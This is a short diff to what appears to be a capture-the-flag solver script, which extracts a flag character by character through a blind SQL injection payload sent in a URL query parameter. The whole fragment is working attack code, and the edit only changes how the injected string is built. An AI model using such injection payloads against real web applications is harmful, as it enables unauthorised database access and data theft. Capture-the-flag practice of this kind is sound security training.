@@ -10,7 +10,7 @@ while not flag.endswith("}"):
 
     for ch in chars:
         test = flag + ch
-        payload = "__nohit__%' OR INSTR(BINARY (SELECT flag FROM challenge_flags WHERE challenge_id='blind-notice'), BINARY '%s') > 0 -- " % test
+        payload = "__nohit__%' OR INSTR(BINARY (SELECT flag FROM challenge_flags WHERE challenge_id='blind-notice'), BINARY '" + test + "') > 0 -- "
         full_url = url + "?" + urlencode({"q": payload})
 
         with urlopen(full_url, timeout=5) as res:
